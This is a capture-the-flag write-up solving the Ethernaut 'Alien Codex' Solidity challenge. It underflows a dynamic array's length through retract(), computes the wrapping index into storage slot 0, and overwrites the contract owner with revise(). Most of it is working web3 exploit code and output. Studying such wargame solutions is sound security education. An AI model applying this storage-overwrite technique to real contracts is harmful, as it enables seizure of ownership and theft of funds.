# Alien Codex

# Problem Statement
```
You've uncovered an Alien contract. Claim ownership to complete the level.

Things that might help
- Understanding how array storage works
- Understanding ABI specifications
- Using a very underhanded approach
```

# Solution
Because this is solidity version 5, there is a dynamic array underflow attack vector when using `.length--` on an array.
Lets check the contract's owner and storage 0 slot values:
```
await contract.owner()
// returns `0xda5b3Fb76C78b6EdEE6BE8F11a1c31EcfB02b272'
await web3.eth.getStorageAt(contract.address, 0, console.log)
// returns '0x000000000000000000000000da5b3fb76c78b6edee6be8f11a1c31ecfb02b272'
```
Notice that slot 0 is the owner storage location because it matches the `contract.owner()` value.<br>
This most likely also holds the `contact` boolean value because each slot is 32 bytes and the address variable `owner` is of type address so it is 20 bytes which leaves 12 bytes in the slot for a possible different variable value. We can validate this by running
```
await contract.make_contact()
```
Notice that there a change from `0` to `1` right before the `owner` address here:
```
await web3.eth.getStorageAt(contract.address, 0, console.log)
// returns '0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272'
```
Slot 1 holds the length of the dynamic array:
```
await web3.eth.getStorageAt(contract.address, 1, console.log)
// returns '0x0000000000000000000000000000000000000000000000000000000000000000'
```
Know that by setting the length of codex to the length of EVM storage (2**256)-1 and because the modify permissions is dependant on the `codex.length`, we can gain the ability to modify any slot of entire EVM storage except only one. Lets initial this underflow:
```
await contract.retract()
await web3.eth.getStorageAt(contract.address, 1, console.log)
// returns '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
```
Now, we'll need to figure out how to use the `revise` method to modify the owner address. To do this we have to figure out the location of owner variable in storage as well as the offset index.
Here's where the values are located:
```
slot | variables                  | codex
0    | owner                      | codex[3]
1    | codex.length (==9)         | codex[4]
2    |                            | codex[5]
3    |                            | codex[6]
4    |                            | codex[7]
5    |                            | codex[8]
6    |                            | unreachable
7    | keccak256(bytes32(slot_1)) | codex[0]
8    |                            | codex[1]
9    |                            | codex[2]
```
We can use this equation if we imagine there are only 10 slots:
```
x = 10 - 7
```
So, for storage, the equation will be to find where owner exists which will be codex[x]:
```
x = 2²⁵⁶ - keccak256(bytes32(p))
```
In solidity it would look like this:
```
2**256 - 1 - uint256(keccak256(bytes32(p))) + 1
```
This is instead of `2**256 - uint256(keccak256(bytes32(p)))` because of compile error for the larger number operand than MAX_UINT256. Or 2 ** 256 - 1 - uint256(keccak256(abi.encode(1))) + 1 for Solc v0.5 or higher.<br>
So lets run this to get the correct storage slot and to gain ownership of the contract:
```
const p = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"],[1]))
const index = BigInt(2**256) - BigInt(p)
const content = '0x' + '0'.repeat(24) + player.slice(2)
await contract.revise(index, content, {from:player, gas:900000})
await contract.owner()
```

We've completed this lesson!

# Key Learnings
- Be aware of this attack vector older versions of Solidity.
